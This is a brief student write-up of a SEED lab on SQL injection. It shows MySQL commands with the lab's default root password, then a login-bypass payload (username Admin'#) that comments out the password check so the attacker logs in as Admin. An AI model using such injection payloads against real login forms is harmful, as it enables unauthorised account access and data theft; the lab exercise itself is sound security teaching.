# Seed-lab-SQL-injection

# Task 1
sudo mysql -u root -pseedubuntu

mysql> use Users;

mysql> show Tables;

mysql> select * from credential where Name = 'Alice';

![Task 1 Image](https://github.com/M-Kamran-Arshad/Seed-lab-SQL-injection/blob/main/task%201.png)

# task 2

Username "Admin'#"
Password "abc" It will result in a SQL query as:

SELECT id, name, eid, salary, birth, ssn, address, email,

nickname, Password

FROM credential

WHERE name= 'Admin' #' and Password='abc'

Then statements after # will be regarded as comments. So we can log in as Admin.

![Task 1 Image](https://github.com/M-Kamran-Arshad/Seed-lab-SQL-injection/blob/main/task%202.1.png)
